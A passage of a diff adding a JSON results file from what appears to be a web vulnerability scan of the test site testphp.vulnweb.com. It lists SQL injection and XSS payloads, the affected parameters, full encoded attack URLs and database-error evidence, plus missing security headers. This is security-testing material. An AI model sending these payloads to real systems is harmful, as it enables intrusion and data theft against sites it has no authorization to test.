+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+%271%27%3D%271",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+1%3D1+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4%22+OR+%22%22+%3D+%22",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4%27%3B+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4%27+OR+SLEEP%285%29--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "cat",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+%271%27%3D%271",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+1%3D1+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%22+OR+%22%22+%3D+%22",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27%3B+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+OR+SLEEP%285%29--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "cat",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+%271%27%3D%271",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+1%3D1+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2%22+OR+%22%22+%3D+%22",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2%27%3B+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2%27+OR+SLEEP%285%29--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "cat",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=2%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+      "param": "aaaa/",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+      "param": "aaaa/",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+      "param": "aaaa/",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+      "param": "aaaa/",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "pp",
+      "payload": "<script>alert('x')</script>",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12%3Cscript%3Ealert%28%27x%27%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "pp",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "pp",
+      "payload": "<img src=x onerror=alert(1)>",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "pp",
+      "payload": "<svg/onload=alert(1)>",
+      "url": "http://testphp.vulnweb.com/hpp/?pp=12%3Csvg%2Fonload%3Dalert%281%29%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1%27+OR+1%3D1+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1%22+OR+%22%22+%3D+%22",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1%27%3B+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1%27+OR+SLEEP%285%29--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "artist",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=1%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/guestbook.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/guestbook.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/guestbook.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/guestbook.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/guestbook.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/guestbook.php",
+      "param": "name",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/guestbook.php",
+      "param": "name",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/guestbook.php",
+      "param": "name",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/guestbook.php",
+      "param": "name",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/guestbook.php",
+      "param": "text",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/guestbook.php",
+      "param": "text",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/guestbook.php",
+      "param": "text",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/guestbook.php",
+      "param": "text",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2%27+OR+%271%27%3D%271",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2%27+OR+1%3D1+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2%22+OR+%22%22+%3D+%22",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2%27%3B+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2%27+OR+SLEEP%285%29--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "artist",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=2%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3%27+OR+%271%27%3D%271",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3%27+OR+1%3D1+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3%22+OR+%22%22+%3D+%22",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3%27%3B+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "artist",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3%27+OR+SLEEP%285%29--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "artist",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/artists.php?artist=3%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/signup.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/signup.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/signup.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/signup.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/signup.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/secured/newuser.php",
+      "param": "uuname",
+      "payload": "' OR SLEEP(5)--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/secured/newuser.php",
+      "param": "uuname",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/secured/newuser.php",
+      "param": "uuname",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/secured/newuser.php",
+      "param": "uuname",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
